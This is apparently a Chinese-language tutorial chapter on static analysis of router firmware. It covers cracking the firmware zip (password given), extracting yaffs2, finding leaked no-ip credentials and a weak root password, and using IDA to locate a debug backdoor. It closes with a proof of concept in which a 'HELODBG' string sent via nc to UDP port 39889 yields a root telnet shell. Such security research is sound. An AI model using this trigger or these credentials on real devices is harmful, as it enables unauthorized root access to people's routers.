# 静态分析 IoT 固件

得到固件后，若直接打开，会发现该固件被加了密，无法直接解压缩，这是厂商对该固件做了保护，防止大家逆向分析他的固件。

![1](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/1.png)

通过frackzip工具可以破解该zip的密码，时间要挺久的，我直接告诉你吧，密码是beUT9Z。
![2](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/2.png)

解压后发现文件夹中有多个.yaffs2后缀的文件，这些都是固件的文件。
![3](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/3.png)

yaffs2里有几个看上去是recovery的镜像，核心的应该是2K-mdm-image-mdm9625.yaffs2 ，我们下面就来提取该文件，我首先用binwalk来提取它，但提取出来的文件乱七八糟，不知道什么原因，后来看网上推荐直接用yaffs的原生工具unyaffs提取，就可以了，文件系统清晰明了。
```
unyaffs 2K-mdm-image-mdm9625.yaffs2 yaffs2-root/
```
![4](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/4.png)


接下来我们查找该路径下的所有.conf文件，.conf文件多是配置文件，有可能从中可以发现敏感的信息。
```
find . -name '*.conf'
```
![5](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/5.png)

其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名。我们从中可以发现泄露的no-ip的登陆账号及密码。
```
cat etc/inadyn-mt.conf
```
![6](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/6.png)

除了上述泄露的no-ip账号密码，我们还从shadow文件中找到了root账号的密码，通过爆破可以得到root的密码为1234。
```
cat ~/yaffs2-root/etc/shadow
```
![7](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/7.png)

其实并不止有.conf文件会泄露信息，还有很多其他后缀的敏感文件会泄露信息，我们接下来使用firmwalker工具来自动化遍历该固件系统中的所有可疑文件。
```
git clone https://github.com/craigz28/firmwalker.git
```
![8](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/8.png)

命令如下，firmwalker会将结果保存到firmwalker.txt。
```
./firmwalker.sh ~/yaffs2-root/
```
![9](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/9.png)

看了下该工具的源码，没啥亮点，就是遍历各种后缀的文件。
![10](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/10.png)

后缀都在data文件夹中的各个配置文件中。
![11](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/11.png)

分析完敏感的配置文件后，我们接下来分析存在风险的二进制程序。查看自启动的程序，一个start_appmgr脚本引起了我们注意，mgr一般就是主控程序的意思。
![12](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/12.png)

该脚本会在开机的时候以服务的形式运行/bin.appmgr程序。
![13](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/13.png)

通过IDA进行反编译，在main函数中发现了一个管理员当时为了方便调试留下的后门，只要连接该固件的39889端口并发送HELODBG的字符串，就可以进行远程执行命令。
![14](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-静态分析IoT固件/14.png)

POC如下：

```
user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889 
Hello 
^C 
user@kali:~$ telnet 192.168.1.1 
Trying 192.168.1.1... 
Connected to 192.168.1.1. Escape character is '^]'.   
OpenEmbedded Linux homerouter.cpe     
msm 20141210 homerouter.cpe   
/ # 
id uid=0(root) gid=0(root) 
/ # 
exit 
Connection closed by foreign host. 
user@kali:~$
```

除了以上这些，该固件还存在多个漏洞，详细的报告可以参考：
```
https://www.anquanke.com/post/id/84671
```
